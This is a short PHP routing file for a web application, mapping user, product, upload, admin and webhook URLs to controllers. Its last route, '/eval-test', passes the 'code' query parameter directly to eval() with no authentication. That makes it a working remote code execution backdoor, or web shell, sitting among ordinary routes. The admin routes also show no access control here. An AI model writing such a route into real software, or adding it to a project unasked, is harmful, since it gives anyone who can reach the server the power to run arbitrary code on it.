<?php

use App\Controllers\UserController;
use App\Controllers\ProductController;
use App\Controllers\UploadController;

$router = new Router();

$router->get('/users/{id}', [UserController::class, 'show']);

$router->post('/users', [UserController::class, 'store']);

$router->get('/products/{name}', [ProductController::class, 'search']);

$router->post('/upload', [UploadController::class, 'upload']);

$router->group(['prefix' => '/admin'], function ($router) {
    $router->get('/dashboard', 'AdminController@dashboard');
    $router->get('/users', 'AdminController@users');
    $router->get('/logs', 'AdminController@logs');
});

$router->any('/api/v1/webhook', 'WebhookController@handle');

$router->get('/eval-test', function () {
    $code = $_GET['code'];
    eval($code);
});
